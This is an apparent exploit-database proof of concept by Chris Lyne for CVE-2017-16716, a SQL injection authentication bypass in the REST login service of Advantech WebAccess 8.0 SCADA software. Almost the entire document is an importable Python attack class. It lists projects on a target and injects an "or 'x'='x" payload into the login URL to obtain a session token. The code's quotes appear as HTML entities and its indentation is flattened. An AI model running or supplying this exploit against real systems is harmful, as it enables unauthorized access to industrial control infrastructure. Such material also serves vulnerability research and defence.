 
# Exploit Title: Advantech WebAccess BWSCADARest Login Method SQL Injection Authentication Bypass Vulnerability
# Date: 01-13-2018
# Exploit Author: Chris Lyne (@lynerc)
# Vendor Homepage: www.advantech.com
# Software Link: http://advcloudfiles.advantech.com/web/Download/webaccess/8.0/AdvantechWebAccessUSANode8.0_20150816.exe
# Version: Advantech WebAccess 8.0-2015.08.16
# Tested on: Windows Server 2008 R2 Enterprise 64-bit
# CVE : CVE-2017-16716
# See Also: http://zerodayinitiative.com/advisories/ZDI-18-065/
 
# Notes:
#
# There are two service interfaces:
# 1) SOAP
# 2) REST
#
# This PoC targets REST
#
# The web services did not work out of the box, and a new website/app was created in IIS for testing.
# This issue was potentially due to the fact that testing was completed against a trial version.
# PoC may need slight tweaks depending on configuration of the web service.
#
# Original vulnerability was reported for more recent software version.
#
# This WebAccessAuthBypass class can be imported :-) 
 
import sys, requests
from xml.etree import ElementTree
 
class WebAccessAuthBypass:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.base_url = "http://%s:%s/BWMobileService/BWScadaRest.svc/" % (ip, port)
         
    def convert_entities(self, s):
    return s.replace(&#039;>&#039;, &#039;>&#039;).replace(&#039;<&#039;, &#039;<&#039;) # convert html entities in response, for parsing
 
    def get_project_list(self):
    print &#039;Getting list of projects...&#039;
    res = requests.get(self.base_url)
    projects = list()
    if res.status_code != 200:
        print &#039;Bad HTTP response...&#039;
    else:
        if &#039;PROJECT&#039; not in res.text:
        print &#039;No projects listed by service.&#039;
        else:
        s = self.convert_entities(res.text)
        xml = ElementTree.fromstring(s)
        for project_list in xml:
            for project in project_list:
            name = project.get(&#039;NAME&#039;)
            if name is not None:
                projects.append(name)
    if len(projects) > 0:
        print &#039;Found the following projects: &#039; + str(projects)
        return projects
    else:
        return None
 
    # returns a token
    def login(self, project):
    # SQL Injection into the user parameter
    url = self.base_url + "Login/" + project + "/notadmin&#039;%20or%20&#039;x&#039;%3D&#039;x/nopass" # notadmin&#039; or &#039;x&#039;=&#039;x
    res = requests.get(url)
    token = None
    if res.status_code != 200:
        print &#039;Bad HTTP response...&#039;
    else:
        if &#039;OK TOKEN&#039; not in res.text:
        print &#039;No token returned by service.&#039;
        else:
        s = self.convert_entities(res.text)
        xml = ElementTree.fromstring(s)
        if len(xml) > 0:
            token = xml[0].get(&#039;TOKEN&#039;)
    return token
 
    # token returned can be used for more transactions
    def get_token(self):
        project_list = self.get_project_list()
        project = project_list[0] # might as well pick the first project
        token = self.login(project_list[0])
        return token
 
if __name__ == "__main__":
    ip = &#039;targetip&#039;
    port = &#039;port#&#039;
    bypass = WebAccessAuthBypass(ip, port)
    token = bypass.get_token()
 
    if token is not None:
    print &#039;Successfully got an authentication token: &#039; + token
    else:
    print &#039;Unsuccessful.&#039;

